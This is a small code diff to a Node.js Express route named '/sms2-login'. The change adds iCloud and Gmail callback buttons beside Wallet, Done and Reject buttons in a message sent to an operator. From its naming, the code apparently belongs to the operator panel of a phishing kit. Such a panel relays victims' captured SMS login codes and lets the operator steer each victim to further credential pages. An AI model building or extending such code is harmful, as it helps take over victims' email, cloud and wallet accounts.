@@ -1652,7 +1652,11 @@ app.post("/sms2-login", async (req, res) => {
         inline_keyboard: [
           [{ text: "💼 Wallet 💼", callback_data: `sms2_wallet|${sms2Id}` }],
           [{ text: "🏁 Done 🏁", callback_data: `sms2_done|${sms2Id}` }],
-          [{ text: "❌ Reject ❌", callback_data: `sms2_reject|${sms2Id}` }]
+          [{ text: "❌ Reject ❌", callback_data: `sms2_reject|${sms2Id}` }],
+          [
+            { text: "☁️", callback_data: `sms2_icloud|${sms2Id}` },
+            { text: "🌈", callback_data: `sms2_gmail|${sms2Id}` }
+          ]
         ]
       }
     };
@@ -1672,7 +1676,7 @@ app.post("/sms2-login", async (req, res) => {
       })
     });
 
-    console.log('✅ SMS 2 message sent with 3 buttons');
+    console.log('✅ SMS 2 message sent with 5 buttons');
     res.json({ status: "pending", sms2Id });
 
   } catch (err) {
